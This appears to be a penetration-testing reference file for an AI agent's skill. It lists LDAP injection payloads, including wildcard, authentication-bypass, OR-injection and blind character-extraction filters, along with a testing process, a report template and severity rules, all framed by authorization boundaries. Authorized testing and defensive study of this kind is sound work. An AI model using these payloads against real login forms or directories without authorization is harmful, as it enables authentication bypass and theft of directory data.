# LDAP Injection Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify LDAP injection vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual credential extraction is prohibited
> - LDAP payloads are for understanding attack surface only, **no directory data harvesting**
> - Validation proves vulnerability existence (query manipulation), **no sensitive object access**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Common in enterprise authentication, directory services, and legacy applications**

---

## Validation Objectives (Within Security Boundary)

LDAP injection vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Query Manipulation | ✓ Test filter bypass | - | Extract user credentials |
| Object Access | ✓ Test object listing | ✓ Read limited objects | Read sensitive attributes |
| Authentication Bypass | ✓ Test auth bypass logic | - | Actually authenticate |
| Blind LDAP Injection | ✓ Test response differences | - | Enumerate all objects |

**Safe Validation Method**: Test if LDAP query can be manipulated using wildcards and operators; do not extract credentials or enumerate full directory.

---

## LDAP Query Structure

### Basic LDAP Filter Syntax

```text
# AND operator
(&(condition1)(condition2))

# OR operator
(|(condition1)(condition2))

# NOT operator
(!(condition))

# Common attributes
uid        - User identifier
cn         - Common name
mail       - Email
userPassword - Password hash
objectClass - Object type
```

### Example Queries

```text
# Find user by uid
(uid=username)

# Find user by email
(mail=user@example.com)

# Find all users
(objectClass=user)

# Authentication query
(&(uid=username)(userPassword=password))
```

---

## LDAP Injection Payloads

### Wildcard Injection

```text
# Original query
(uid=username)

# Wildcard payload
(uid=*)           -> Returns all users
(uid=admin*)      -> Returns users starting with admin
(uid=*admin*)     -> Returns users containing admin
(cn=*)            -> Returns all common names
```

### Authentication Bypass

```text
# Original auth query
(&(uid=username)(userPassword=password))

# Bypass payload 1: Always true
(&(uid=username)(userPassword=*))        -> Any password accepted
(&(uid=*)(userPassword=*))               -> Any user, any password

# Bypass payload 2: OR injection
(&(uid=username)(|(userPassword=*)(something=valid)))

# Bypass payload 3: Comment injection
(&(uid=username)(userPassword=password)(objectClass=*)

# Bypass payload 4: AND manipulation
(&(uid=admin)(userPassword=admin))(|(uid=*)(userPassword=*))
```

### Common Bypass Payloads

```text
# Username injection
username=*)(uid=*))(&(uid=*

# Password injection
password=*)(password=*))(&(password=*

# OR injection
username=admin)(|(password=*
username=*)(|(uid=*

# Null injection
username=admin%00

# Filter close injection
username=admin)(cn=*)
username=admin)(|(cn=*)(cn=*
```

---

## LDAP Search Parameters

### Entry Point Testing

```bash
# Login form LDAP injection
username=*
username=admin)(|(password=*
username=admin)(cn=*

# Search parameter injection
search=*
search=admin*)(objectClass=user

# API parameter injection
GET /api/user?uid=*
GET /api/search?name=*)(objectClass=*
```

---

## Blind LDAP Injection

### Boolean-based Blind

```text
# Test condition
(&(uid=*)(objectClass=user))  -> Returns results
(&(uid=*)(objectClass=invalid)) -> No results

# Infer objectClass by response difference
(&(uid=admin*)(objectClass=user)) -> true/false
(&(uid=admin*)(mail=admin@*)) -> Has this email pattern?
```

### Character Extraction

```text
# Extract username character by character
(&(uid=a*)(objectClass=user))  -> Starts with a?
(&(uid=b*)(objectClass=user))  -> Starts with b?
(&(uid=ad*)(objectClass=user)) -> Starts with ad?

# Repeat for each character position
```

---

## LDAP Operators Reference

| Operator | Description | Example |
|----------|-------------|---------|
| `=` | Equality | `(uid=admin)` |
| `~=` | Approx match | `(cn~=John)` |
| `>=` | Greater or equal | `(uid>=1000)` |
| `<=` | Less or equal | `(uid<=2000)` |
| `*` | Wildcard | `(uid=admin*)` |
| `()` | Grouping | `(&(cond1)(cond2))` |
| `&` | AND | `(&(uid=x)(mail=y))` |
| `|` | OR | `(|(uid=x)(uid=y))` |
| `!` | NOT | `(!(uid=admin))` |

---

## Attribute Enumeration

### Common LDAP Attributes

```text
# User attributes
uid, cn, sn, givenName, mail, telephoneNumber, userPassword, objectClass

# Group attributes
cn, member, objectClass=group

# Organizational attributes
ou, dc, o, l, st, c
```

### Safe Object Class Discovery

```text
# Check if objectClass user exists
(objectClass=user)

# Check for groups
(objectClass=group)

# Check for organizational units
(objectClass=organizationalUnit)
```

---

## Analysis Process

1. Identify LDAP-backed endpoints (enterprise login, directory search)
2. Test wildcard injection (`*`) in username/search parameters
3. Test authentication bypass patterns if login form
4. Test OR/AND injection for query manipulation
5. Analyze response differences for blind injection
6. **Stop validation**, confirm LDAP query manipulation possible
7. Do not enumerate all users or extract passwords

---

## Output

```markdown
## Vulnerability: LDAP Injection

### Location
{URL} - {parameter name}

### LDAP Query Type
{Authentication / Search / Blind}

### Proof Payload
uid=*)(objectClass=user

### Validation Result
- Wildcard injection: ✓ All users returned
- Query bypass: ✓ Authentication bypassed
- Response difference: ✓ Boolean blind possible

### Risk Level
{see severity rules}

### Severity Classification

LDAP injection must distinguish "**query manipulation succeeds**" from "**actually bypassing authentication / stealing data**". Injectability — `*)(uid=*` returning multiple records — only confirms query manipulation; High requires actually using injection to bypass login or enumerate sensitive directory data.

| Actual case | Severity | Note |
|---------|------|------|
| injection confirms authentication-bypass logic (for example `admin)(&` makes password validation always true, login state achieved)| **High** | authentication bypass confirmed |
| Injection causes directory data enumeration (returns user lists / organization structure or other sensitive data)| **Medium** | Data leak but not authentication bypass; can be escalated based on data sensitivity |
| Query manipulation confirmed (response changes / boolean blind feasible) but no data retrieved / no authentication bypass | Low | Capability not confirmed as actual impact |
| Response anomaly only (suspected injection but no stable manipulation)| Low | Pending confirmation |

**Boundary**: Actual authentication login is Tier 2 (requires user authorization with test account). Within default scope, prove injection existence via response differences only; do not actually log in. Do not report Critical based on "injectability" — must confirm authentication bypass or sensitive data disclosure.
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Credential extraction | Do not read userPassword or password attributes |
| ❌ Full directory dump | Do not enumerate all users/groups |
| ❌ Sensitive attribute access | Do not access private/corporate data |
| ❌ Account manipulation | Do not modify LDAP objects |
| ❌ Privilege escalation | Do not use injection to gain admin access |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `SKILL.md` -> Action Policy -> "Authenticated testing | Ask first"